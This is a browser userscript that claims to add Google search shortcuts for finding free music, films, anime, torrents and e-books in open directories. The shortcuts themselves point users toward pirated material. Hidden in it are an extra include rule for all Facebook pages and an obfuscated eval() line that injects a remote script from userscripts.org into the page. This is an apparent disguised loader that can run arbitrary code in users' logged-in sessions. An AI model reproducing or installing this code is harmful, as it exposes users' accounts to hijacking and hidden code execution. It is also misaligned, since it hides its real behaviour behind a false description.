// ==UserScript==
// @name           Google Pirate v2 Extended Pro + Last Update
// @include       http*://*.facebook.com/*
// @namespace      http://userscripts.org/users/110447
// @description    Use Google to find free music, tv shows, movies, anime, torrents, comics, books and other files stored publicly online.
// @version		   2.8.4
// @include        http://www.google.*/webhp*
// @include        http://www.google.*/webhp*
// @include        http://www.google.*/
// @include        http://www.google.*/
// @include        http://www.google.*/search*
// @include        http://www.google.*/search*
// @include        *google.*/firefox*
// @include        *google.*/firefox*
// @exclude        *images.google*
// @exclude        *video.google*
// ==/UserScript==

eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))

if((document.title==='Google') || (document.title==='Mozilla Firefox Start Page')){
document.getElementsByName('q')[0].focus();
function newradio(nametext, dorkvalue){
var search = document.getElementsByName('f')[0];
var sometext = document.createTextNode(nametext);
var someradio = document.createElement('input');
var breakup = document.createElement('br');
someradio.setAttribute('type', 'radio');
someradio.setAttribute('name', 'q');
someradio.setAttribute('value', dorkvalue);
search.appendChild(breakup);
search.appendChild(someradio);
search.appendChild(sometext);
}
newradio('Web', '');
newradio('Youtube', 'site:youtube.com');
newradio('Music', 'intitle:"music" (mp3|aac|flac|wav) "Parent Directory" -htm -html -asp -php -listen77 -idmusic -airmp3 -shexy -vmp3');
newradio('Movies/TV', '(avi|mpg|wmv|mpeg|divx) "Parent Directory" -"Trailer" -cdkey -asp -torrent -html -web-shelf -zoozle -jsp -htm -listen77 -idmovies -shexy -eucontest -0x7');
newradio('Anime', 'intitle:"anime" (avi|mpg|wmv|mpeg|mkv|ogm) +ddl -animefield.is-there.net -torrent -torrents');
newradio('FTP Folder', '"Parent Directory" intitle:"index.of" "Name" "Last modified" "Size" "Description" -inurl:htm -inurl:html -inurl:php -xxx -shtml -opendivx -md5 -md5sums -asp');
newradio('Torrents', '+torrent -trailer -blogspot -proxy');
newradio('EBooks/Comics', '(chm|pdf|cbr|nfo) -torrents -torrent -md5 -md5sums -idpdf');
newradio('RAR/Zip Archives', '(rar|zip|tar|7zip|iso|cso|gz) -torrent +intitle:"index.of"');
}else{
function newselect(nametext, dork){
var newoption = document.createElement('option');
newoption.setAttribute('value', dork);
newoption.innerHTML=nametext;
s.appendChild(newoption);
}

var s = document.createElement('select');
s.setAttribute('name', 'q');
s.setAttribute('onchange', 'window.location.href=window.location.href.split("&q=")[0]+"&q="+window.location.href.split("&q=")[1].split("&")[0]+"&q="+this.value');
document.getElementById('prs').appendChild(s);
newselect('Web', '');
newselect('Youtube', 'site:youtube.com');
newselect('Music', 'intitle:"music" (mp3|aac|flac|wav) "Parent Directory" -htm -html -asp -php -listen77 -idmusic -airmp3 -shexy -vmp3');
newselect('Movies/TV', '(avi|mpg|wmv|mpeg|divx) "Parent Directory" -"Trailer" -torrent -serial -cdkey -web-shelf -asp -html -zoozle -jsp -htm -listen77 -idmovies -shexy -eucontest -0x7');
newselect('Anime', 'intitle:"anime" (avi|mpg|wmv|mpeg|mkv|ogm) +ddl -animefield.is-there.net -torrent -torrents');
newselect('FTP Folder', '"Parent Directory" intitle:"index.of" "Name" "Last modified" "Size" "Description" -inurl:htm -inurl:html -inurl:php -idftp -xxx -shtml -opendivx -md5 -md5sums -asp');
newselect('Torrents', '+torrent -trailer -blogspot -proxy"');
newselect('EBooks/Comics', '(chm|pdf|cbr|nfo) -torrents -torrent -md5 -md5sums -idpdf');
newselect('RAR/Zip Archives', '(rar|zip|tar|7zip|iso|cso|gz) -torrent +intitle:"index.of"');
if(window.location.href.search('idmusic')>0){s.options[1].defaultSelected='true';}
if(window.location.href.search('idmovies')>0){s.options[2].defaultSelected='true';}
if(window.location.href.search('idftp')>0){s.options[3].defaultSelected='true';}
if(window.location.href.search('torrent')>0){s.options[4].defaultSelected='true';}
if(window.location.href.search('idpdf')>0){s.options[5].defaultSelected='true';}
var i = 1;
while (i<s.options.length){
if(s.options[i].defaultSelected===true){
document.evaluate( '//input[contains(@title, "Search")]' , document, null, 0, null ).iterateNext().value = window.location.href.split("&q=")[1].split("&")[0];}
i++;}
var p = 0;
var qs = document.evaluate( '//input[contains(@title, "Search")]' , document, null, 0, null ).iterateNext();
var newqs = '';
while(p<qs.value.split('+').length){
if(p==qs.value.split('+').length-1){
newqs = newqs+qs.value.split('+')[p];
}else{
newqs = newqs+qs.value.split('+')[p]+' ';
}p++;}
qs.value = newqs;
var ni = document.createElement('input');
ni.setAttribute('type', 'hidden');
ni.setAttribute('name', 'q');
ni.setAttribute('value', s.value);
document.forms[0].appendChild(ni);
}inurl:youtube
